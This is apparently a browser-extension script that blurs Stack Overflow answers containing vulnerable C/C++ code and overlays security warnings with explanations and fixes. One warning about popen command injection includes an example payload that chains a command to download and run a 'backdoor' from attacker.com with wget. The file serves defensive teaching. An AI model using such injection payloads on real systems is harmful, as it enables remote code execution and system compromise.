// Icons are from http://chittagongit.com/


/**
 * This function Will accept an answerId and a warning message and will blur the answer and shows the warning message over the answer
 * @param answerIdToHide
 * @param warningMessage
 */
function hideAnswer(answerIdToHide, warningMessage) {
    const answerIdSelector = '#answer-' + answerIdToHide;
    $(answerIdSelector).wrapAll('<div class="vuln-codesnippet"></div>');
    $(answerIdSelector).parent().append("" +
        "<div class='warning'>" +
        "<div class='header-icon'> </div>" +
        "<h3 style='font-weight: bolder'>This answer contains a vulnerable code snippet!</h3>" +
        "<p class='messageholder'>" +
        warningMessage +
        "</p>" +
        "<button class='seecode clc-cp-sb--tall clc-cp-sb-learnmore clc-cp-sb-learnmore-button'>Okay, I just wanna see this code</button>" +
        " </div>");

    $('.seecode').on('click', function () {
        const $vuln_cs = $(this).parent();
        $vuln_cs.addClass('animated bounceOut');
        $vuln_cs.prev().css('filter', 'blur(0px)');

    });
}


//To optimize extension speed, We'll first find Question ID from URL using `indexOf` since it's faster than `regex`:
const URL = document.location.href;

if (URL.startsWith('https://stackoverflow.com/questions/')) {
    // length of 'https://stackoverflow.com/questions/' is 36. So we'll search from 36-th character until '/'
    const START_INDEX_OF_QUESTION_ID_IN_URL = 36;
    const END_INDEX_OF_QUESTION_ID_IN_URL = URL.indexOf('/', START_INDEX_OF_QUESTION_ID_IN_URL);
    const QUESTION_ID = Number(URL.substring(START_INDEX_OF_QUESTION_ID_IN_URL, END_INDEX_OF_QUESTION_ID_IN_URL));

    //Now let's see if there is actually a vulnerable answer in this question using HashTable and our hardcoded vulnerable answers.
    //Keys of an Object in Javascript use HashTable under the hood with o(1) lookup time.
    //1th level keys of this object contain Question ids
    //Inside each QuestionId is an array of answers with AnswerId as key and Warning message as value

    const QUESTION_IDS_WITH_VULN_ANSWERS = {"7724448": {"7725289": "<h4>Explain</h4>\n<p>This answer will not work for many of Unicode characters, please do not consider strings only as ASCII. Since it's Json related function it'll most likely end up having characters from user and may have Unicode characters as well.</p>\n<h4>Keywords</h4>\n<p>!&lt;&lt; \"\\f\"\n@!setw(4)</p>\n<h4>Mitigation</h4>\n<p>As suggested in answer, use <a href=\"https://stackoverflow.com/a/33799784/3686236\">this answer</a> instead.</p>\n<h4>References</h4>"}, "236129": {"236803": "<h4>Explain</h4>\n<p>when we use null terminator (<code>\\0</code>) as splitter argument, function wouldn't able to handle it since it'll parse \\0 as end of string.</p>\n<p><strong>example</strong>:\n<code>split(\"PART1\\x00PART2\", \"\\x00\");</code>\nit returns <code>PART1</code> while it should return both <code>PART1</code> and <code>PART2</code>.</p>\n<h4>Keywords</h4>\n<p>!split\n!substart\n!while (true)\n!search</p>\n<h4>Mitigation</h4>\n<p><a href=\"https://en.cppreference.com/w/cpp/io/basic_streambuf/setg\">C++ Reference(with code snippet)</a></p>\n<h4>References</h4>\n<p><a href=\"https://en.cppreference.com/w/cpp/string/basic_string/data\">https://en.cppreference.com/w/cpp/string/basic_string/data</a></p>", "236180": "<h4>Explain</h4>\n<p>when we use null terminator (<code>\\0</code>) as splitter argument, function wouldn't able to handle it since it'll parse \\0 as end of string.</p>\n<p><strong>example</strong>:\n<code>split(\"PART1\\x00PART2\", \"\\x00\");</code>\nit returns <code>PART1</code> while it should return both <code>PART1</code> and <code>PART2</code>.</p>\n<h4>Keywords</h4>\n<p>!split\n!substart\n!while (true)\n!search</p>\n<h4>Mitigation</h4>\n<p><a href=\"https://en.cppreference.com/w/cpp/io/basic_streambuf/setg\">C++ Reference(with code snippet)</a></p>\n<h4>References</h4>\n<p><a href=\"https://en.cppreference.com/w/cpp/string/basic_string/data\">https://en.cppreference.com/w/cpp/string/basic_string/data</a></p>", "9676623": "<h4>Explain</h4>\n<p>when we use null terminator (<code>\\0</code>) as splitter argument, function wouldn't able to handle it since it'll parse \\0 as end of string.</p>\n<p><strong>example</strong>:\n<code>split(\"PART1\\x00PART2\", \"\\x00\");</code>\nit returns <code>PART1</code> while it should return both <code>PART1</code> and <code>PART2</code>.</p>\n<h4>Keywords</h4>\n<p>!split\n!substart\n!while (true)\n!search</p>\n<h4>Mitigation</h4>\n<p><a href=\"https://en.cppreference.com/w/cpp/io/basic_streambuf/setg\">C++ Reference(with code snippet)</a></p>\n<h4>References</h4>\n<p><a href=\"https://en.cppreference.com/w/cpp/string/basic_string/data\">https://en.cppreference.com/w/cpp/string/basic_string/data</a></p>"}, "3300419": {"3301284": "<h4>Explain</h4>\n<p>As mentioned in <a href=\"https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax.html\">docs</a>:</p>\n<blockquote>\n<p>Perl (this is the default behavior).</p>\n</blockquote>\n<p>So boost will use <code>perl</code> style regex as default, Charset used for this <a href=\"https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax/perl_syntax.html\">syntax</a> is:</p>\n<blockquote>\n<p>.[{}()*+?|^$</p>\n</blockquote>\n<p>As we can see <code>{</code> and <code>}</code> are not escaped in this function, So if user enter an string like <code>invalid{regex</code> it can crash the program or craft some regexes based on situation.</p>\n<h4>Keywords</h4>\n<p>!boost::replace_all(regex, \"\\\", \"\\\\\");\n!boost::replace_all\n@!boost::replace_all(regex, \"{\", \"{\");</p>\n<h4>Mitigation</h4>\n<ol>\n<li>It's easy to fix this code, You can add these lines too EscapeRegex function:   <br />\n<code>boost::replace_all(regex, \"{\", \"{\");\n    boost::replace_all(regex, \"}\", \"}\");</code></li>\n<li>Use Posix <a href=\"https://stackoverflow.com/a/3301535\">functions</a></li>\n</ol>\n<h4>References</h4>\n<p><a href=\"https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax/perl_syntax.html\">https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax/perl_syntax.html</a>\n<a href=\"https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax.html\">https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax.html</a></p>"}, "27925979": {"27928463": "<h4>Explain</h4>\n<p>This answer uses <code>cudaMalloc</code> function which may fail an return <code>cudaErrorMemoryAllocation</code> instead, but this error has not been checked</p>\n<h4>Keywords</h4>\n<p>!cudaMalloc(</p>\n<h4>Mitigation</h4>\n<p>Check return value of <code>cudaMalloc</code> and take action if it failed.</p>\n<h4>References</h4>\n<p><a href=\"http://horacio9573.no-ip.org/cuda/group__CUDART__MEMORY_gc63ffd93e344b939d6399199d8b12fef.html\">http://horacio9573.no-ip.org/cuda/group__CUDART__MEMORY_gc63ffd93e344b939d6399199d8b12fef.html</a></p>"}, "440133": {"440240": "<h4>Explain</h4>\n<ul>\n<li><code>rand()</code> is an obsoleto function and used most in c.</li>\n<li><code>rand() % mod</code> is not good practice since it'll use lower bits which are not so random.  </li>\n</ul>\n<h4>Keywords</h4>\n<p>!rand()</p>\n<h4>Mitigation</h4>\n<ul>\n<li>Best mitigation is to use another method instead of rand(), like this <a href=\"https://stackoverflow.com/a/24586587\">answer</a></li>\n</ul>\n<h4>References</h4>\n<p><a href=\"http://c-faq.com/lib/randrange.html\">http://c-faq.com/lib/randrange.html</a></p>", "11093644": "<h4>Explain</h4>\n<ul>\n<li><code>rand()</code> is an obsoleto function and used most in c.</li>\n<li><code>rand() % mod</code> is not good practice since it'll use lower bits which are not so random.  </li>\n</ul>\n<h4>Keywords</h4>\n<p>!rand()</p>\n<h4>Mitigation</h4>\n<ul>\n<li>Best mitigation is to use another method instead of rand(), like this <a href=\"https://stackoverflow.com/a/24586587\">answer</a></li>\n</ul>\n<h4>References</h4>\n<p><a href=\"http://c-faq.com/lib/randrange.html\">http://c-faq.com/lib/randrange.html</a></p>", "12468109": "<h4>Explain</h4>\n<ul>\n<li><code>rand()</code> is an obsoleto function and used most in c.</li>\n<li><code>rand() % mod</code> is not good practice since it'll use lower bits which are not so random.  </li>\n</ul>\n<h4>Keywords</h4>\n<p>!rand()</p>\n<h4>Mitigation</h4>\n<ul>\n<li>Best mitigation is to use another method instead of rand(), like this <a href=\"https://stackoverflow.com/a/24586587\">answer</a></li>\n</ul>\n<h4>References</h4>\n<p><a href=\"http://c-faq.com/lib/randrange.html\">http://c-faq.com/lib/randrange.html</a></p>"}, "4504687": {"4505166": "<h4>Explain</h4>\n<p>If image doesn't exist or for any reason Opencv was not able to read it's data, program will crash.\nAlways make sure to check return value of functions.</p>\n<h4>Keywords</h4>\n<p>!cv::imread\n@!if</p>\n<h4>Mitigation</h4>\n<p><code>if(! image.data ){ // Check for invalid input\n    cout &lt;&lt;  \"Could not open or find the image\" &lt;&lt; std::endl ;\n    return -1;\n}</code></p>\n<h4>Reference</h4>\n<p><a href=\"https://docs.opencv.org/2.4/doc/tutorials/introduction/display_image/display_image.html\">https://docs.opencv.org/2.4/doc/tutorials/introduction/display_image/display_image.html</a></p>"}, "8456236": {"8545389": "<h4>Explain</h4>\n<p>This answer implements an custom allocator and hacks standard <code>vector</code> class. It's not a good practice to modify standard C++ headers ( or in any other programming language) since it'll result in compilation error in other platforms, undefined behaviours and bugs, problems in newer language compiler and ... .</p>\n<h4>Keywords</h4>\n<p>!_aligned_malloc\n!_aligned_free</p>\n<h4>Mitigation</h4>\n<p>```</p>\n<h1>include <vector></h1>\n<h1>include <boost/align/aligned_allocator.hpp></h1>\n<p>template <typename T>\nusing aligned_vector = std::vector<T, boost::alignment::aligned_allocator<T, 16>&gt;;\n```\nFrom this <a href=\"https://stackoverflow.com/a/45833474/3686236\">answer</a></p>\n<h4>References</h4>"}, "191842": {"46050762": "<h4>Explain</h4>\n<p>Return values of these functions have not been checked to validate their success: <code>GetStdHandle</code>, <code>_open_osfhandle</code> , <code>_fdopen</code>.</p>\n<h4>Keywords</h4>\n<p>!GetStdHandle\n@!if\n!_open_osfhandle\n@!if\n!_fdopen\n@!if</p>\n<h4>Mitigation</h4>\n<p>```\n// Get STDOUT handle\nHANDLE ConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);\nint SystemOutput = _open_osfhandle(intptr_t(ConsoleOutput), _O_TEXT);\nFILE *COutputHandle = _fdopen(SystemOutput, \"w\");</p>\n<p>// Get STDERR handle\nHANDLE ConsoleError = GetStdHandle(STD_ERROR_HANDLE);\nint SystemError = _open_osfhandle(intptr_t(ConsoleError), _O_TEXT);\nFILE *CErrorHandle = _fdopen(SystemError, \"w\");</p>\n<p>// Get STDIN handle\nHANDLE ConsoleInput = GetStdHandle(STD_INPUT_HANDLE);\nint SystemInput = _open_osfhandle(intptr_t(ConsoleInput), _O_TEXT);\nFILE *CInputHandle = _fdopen(SystemInput, \"r\");\n```</p>\n<h4>References</h4>\n<p>https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fdopen-wfdopen?view=vs-2017</p>"}, "2654480": {"2654860": "<h4>Explain</h4>\n<p>We need to check memory allocation result for:\n<code>img = (unsigned char *)malloc(3*w*h);</code></p>\n<h4>Keywords</h4>\n<p>!malloc(</p>\n<h4>Mitigation</h4>\n<p>Check malloc return value for failure.\n<code>img = (unsigned char *)malloc(3*w*h);\nif(img == NULL)\n    throw \"Malloc Failed!\"</code></p>\n<h4>References</h4>"}, "5095407": {"5097100": "<h4>Explain</h4>\n<p>Infinity loop have not handled.</p>\n<h4>Keywords</h4>\n<p>!if ((first == last) || (first == k) || (last == k))\n!itr1 = last;\n!--itr1;\n!itr1 = k;\n!std::rotate(first,k,last);</p>\n<h4>Mitigation</h4>\n<h4>References</h4>"}, "7402576": {"7413516": "<h4>Explain</h4>\n<p>Reading variable from ENV is not safe at all, because it can be bypassed easily by setting new value for <code>PWD</code> in shell ( like bash ).</p>\n<p><strong>example:</strong> \nSuppose current directory is : <code>/tmp</code> , now run the program:\n<code>$ ./prog\nWorking directory : /tmp</code>\nLet's change <code>PWD</code> value in the environment:\n<code>$ export PWD=/anywhere</code>\nRun the program again:\n<code>$ ./prog\nWorking directory : /anywhere</code></p>\n<h4>Keywords</h4>\n<p>!getenv (\"PWD\");</p>\n<h4>Mitigation</h4>\n<p>Use this <a href=\"https://stackoverflow.com/a/7403075/3686236\">answer</a>:\n<code>QDir::currentPath()</code></p>\n<h4>References</h4>\n<p><a href=\"https://stackoverflow.com/a/7403075/3686236\">https://stackoverflow.com/a/7403075/3686236</a></p>"}, "478898": {"478960": "<h4>Explain</h4>\n<p>This function is vulnerable to code injection (OS command injection) attacks when user inputs are involved without.\nYou can't also check errors of executed commands in this answer.</p>\n<p>Example attack:\nSuppose that user is asked to enter an IP address to ping and program will then concat \"ping \" with received IP address which will result in \"ping 1.1.1.1\". Attacker might add <code>;</code> to add a new command after <code>;</code> which will result in OS command injection. Example input:\n\"ping 1.1.1.1 ; wget http://attacker.com/backdoor; ./backdoor\"</p>\n<h4>Keywords</h4>\n<p>!pipe(popen</p>\n<h4>Mitigation</h4>\n<p>Option 1: Best solution is to use <code>pstreams</code> instead of popen: https://stackoverflow.com/a/10702464\nOption 2: Clear all dangerous characters from function(not always possible).\nOption 3: Create a white list for possible commands.</p>\n<h4>References</h4>"}, "11635": {"4119881": "<h4>Explain</h4>\n<p>This code snippet only works when are characters are in ASCII.\nPlease do never assume characters are ASCII specially when there is user input involved, You can see one of a reasons <a href=\"https://security.stackexchange.com/a/133970/39676\">here</a></p>\n<h4>Keywords</h4>\n<p>!equal\n!tolower</p>\n<h4>Mitigation</h4>\n<p>Use <code>boost::locale::to_lower</code> which works well on UTF8 too. <a href=\"https://www.boost.org/doc/libs/1_51_0/libs/locale/doc/html/conversions.html\">More info</a>.</p>\n<h4>References</h4>\n<p><a href=\"https://security.stackexchange.com/a/133970/39676\">https://security.stackexchange.com/a/133970/39676</a>\n<a href=\"https://www.boost.org/doc/libs/1_51_0/libs/locale/doc/html/conversions.html\">https://www.boost.org/doc/libs/1_51_0/libs/locale/doc/html/conversions.html</a></p>"}, "63166": {"64166": "<h4>Explain</h4>\n<p>The <code>sysctl</code> functionality (sysctl.c) in Linux kernel before <code>2.6.14.1</code> allows local users to cause a denial of service (kernel oops) and possibly execute code by opening an interface file in <code>/proc/sys/net/ipv4/conf/</code>, waiting until the interface is unregistered, then obtaining and modifying function pointers in memory that was used for the <code>ctl_table</code>. </p>\n<h4>Keywords</h4>\n<p>!sysctl.h&gt;\n!sysctl(</p>\n<h4>Mitigation</h4>\n<p>Make sure your kernel version is higher than <code>2.6.14.1</code>.</p>\n<h4>References</h4>\n<p><a href=\"https://www.cvedetails.com/cve/CVE-2005-2709/\">https://www.cvedetails.com/cve/CVE-2005-2709/</a></p>", "1911863": "<h4>Explain</h4>\n<p>The <code>sysctl</code> functionality (sysctl.c) in Linux kernel before <code>2.6.14.1</code> allows local users to cause a denial of service (kernel oops) and possibly execute code by opening an interface file in <code>/proc/sys/net/ipv4/conf/</code>, waiting until the interface is unregistered, then obtaining and modifying function pointers in memory that was used for the <code>ctl_table</code>. </p>\n<h4>Keywords</h4>\n<p>!sysctl.h&gt;\n!sysctl(</p>\n<h4>Mitigation</h4>\n<p>Make sure your kernel version is higher than <code>2.6.14.1</code>.</p>\n<h4>References</h4>\n<p><a href=\"https://www.cvedetails.com/cve/CVE-2005-2709/\">https://www.cvedetails.com/cve/CVE-2005-2709/</a></p>"}, "8115192": {"35585744": "<h4>Explain</h4>\n<p><a href=\"https://issuetracker.google.com/issues/36992928#comment3\">STLPort is dead</a>\n<code>gnustl</code>, <code>gabi++</code>, and <code>stlport</code> have been removed.</p>\n<p>conflicting declaration 'typedef long unsigned int* _Unwind_Ptr' platformVersion = 21 stl = \"gnustl_static\" toolchain = 'gcc' //also with clang</p>\n<h4>Keywords</h4>\n<p>!unwind.h</p>\n<h4>Mitigation</h4>\n<p>Use this <a href=\"https://stackoverflow.com/a/28858941/3686236\">answer</a></p>\n<h4>References</h4>\n<p>https://issuetracker.google.com/issues/36992928\nhttps://developer.android.com/ndk/downloads/revision_history</p>"}, "6417817": {"6417908": "<h4>Explain</h4>\n<p>This function fails when folder has <code>.</code> in its name and file has no extension.</p>\n<p><strong>example:</strong>\n<code>/folder1/folder2/folder.name.with.dots/bin</code> (file without extension) will return:\n<code>/folder1/folder2/folder.name.with</code></p>\n<p>In some cases this is very important since it'll be used in input validation and may result in compromising the system.</p>\n<h4>Keywords</h4>\n<p>!.find_last_of(\".\");\n!if(\n!std::string::npos)\n!return f\n!return\n!substr(0,</p>\n<h4>Mitigation</h4>\n<p>Either use this function only on file name or use Boost library:\n```</p>\n<h1>include <boost/filesystem/convenience.hpp></h1>\n<p>std::string removeFileExtension(const std::string&amp; fileName)\n{\n    return boost::filesystem::change_extension(fileName, \"\").string();\n}\n```</p>\n<h4>References</h4>\n<p>https://stackoverflow.com/a/30800163/3686236</p>"}, "16357999": {"16358264": "<h4>Explain</h4>\n<p><code>strftime</code> is not a c++11 standard and might cause buffer overflow if buffersize is not calculated correctly (80 looks safe here).</p>\n<h4>Keywords</h4>\n<p>!strftime</p>\n<h4>Mitigation</h4>\n<p><a href=\"https://stackoverflow.com/a/16358111/3686236\">use localtime</a></p>\n<h4>References</h4>"}, "40577339": {"40577390": "<h4>Explain</h4>\n<ol>\n<li>To use <code>lower_s</code> in <code>transform</code> function we should have same size with <code>s</code> variable. </li>\n<li>We need to update <code>lower_s</code> after each replace too, because we just replaced words in <code>s</code> and <code>lower_s</code> does not change, so it'll return same value always.\n<strong>example:</strong>\n<code>subTag(\"blahblah\",\"blah\",\"new\");</code> , infinite loop occur.</li>\n</ol>\n<h4>Keywords</h4>\n<p>!lower_s.find(\n!while(\n!!=std::string::npos\n!s.replace\n@!lower_s.replace\n!lower_s.find(</p>\n<h4>Mitigation</h4>\n<ol>\n<li><code>std::string lower_s(\"\",s.size());</code></li>\n<li><code>while(position!=std::string::npos){\n        s.replace(position, a.size(), b);\n        lower_s.replace(position, a.size(), b);\n        position=lower_s.find(a);\n}</code></li>\n</ol>\n<h4>References</h4>\n<p>http://www.cplusplus.com/reference/string/string/find/</p>"}, "41028862": {"41031865": "<h4>Explain</h4>\n<p>If <code>current_index</code> or <code>current_index + sizeof(T)</code> get larger than size of <code>vec</code>, information leakage can occur.\n<code>static T get_from_vector(const std::vector&lt;uint8_t&gt;&amp; vec, const size_t current_index){</code>\n<strong>example:</strong>\n```\nint main(){\n    std::vector<uint8_t> vec {0x01, 0x05};</p>\n<pre><code>auto byte1 = get_from_vector&lt;uint8_t&gt;(vec, 10);\nauto byte2 = get_from_vector&lt;uint16_t&gt;(vec, 20);\nauto byte4 = get_from_vector&lt;uint32_t&gt;(vec, 50);\nauto byte8 = get_from_vector&lt;uint64_t&gt;(vec, 32);\nprintf(\"%x - %x -%x -%x\",byte1,byte2,byte4,byte8);\n</code></pre>\n<p>}\n<code>output it's being like this:</code>\n0 - 0 -0 -382d3531\n```</p>\n<h4>Keywords</h4>\n<p>!const size_t current_index)\n@!if\n!T result;</p>\n<h4>Mitigation</h4>\n<p>Validate size of <code>current_index + sizeof(T)</code> to always be in the boundary of vec.</p>\n<h4>References</h4>"}, "1888863": {"21767578": "<h4>Explain</h4>\n<p>According to <a href=\"https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-enumwindows\">docs</a>:</p>\n<blockquote>\n<p>Return Value\nType: Type: BOOL\nIf the function succeeds, the return value is nonzero.\nIf the function fails, the return value is zero. To get extended error information, call GetLastError.\nIf EnumWindowsProc returns zero, the return value is also zero. In this case, the callback function should call SetLastError to obtain a meaningful error code to be returned to the caller of EnumWindows.</p>\n</blockquote>\n<p><code>EnumWindows</code> function might fail but return value of this function has not been checked</p>\n<h4>Keywords</h4>\n<p>!EnumWindows(</p>\n<h4>Mitigation</h4>\n<p>Check return value of <code>EnumWindows</code> function and needed action if it was false.</p>\n<h4>References</h4>\n<p><a href=\"https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-enumwindows\">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-enumwindows</a></p>"}};


    //If this questionId is listed in our analysis to have at least one vulnerable answer
    if (QUESTION_ID in QUESTION_IDS_WITH_VULN_ANSWERS) {

        //For each answer vulnerable answer in our results object
        Object.keys(QUESTION_IDS_WITH_VULN_ANSWERS[QUESTION_ID]).map((answerIdToHide) => {
                // Access answer O(1)
                let warningMessage = QUESTION_IDS_WITH_VULN_ANSWERS[QUESTION_ID][answerIdToHide];

                // Remove keywords part, since it's not useful for user
                if ( warningMessage.includes("<h4>Keywords</h4>")){
                    const keywordsStart = warningMessage.indexOf("<h4>Keywords</h4>");
                    const keywordsEnd = warningMessage.indexOf("<h4>Mitigation</h4>");
                    warningMessage = warningMessage.substring(0, keywordsStart) + warningMessage.substring(keywordsEnd);
                }

                hideAnswer(answerIdToHide, warningMessage);
        });
    }
}
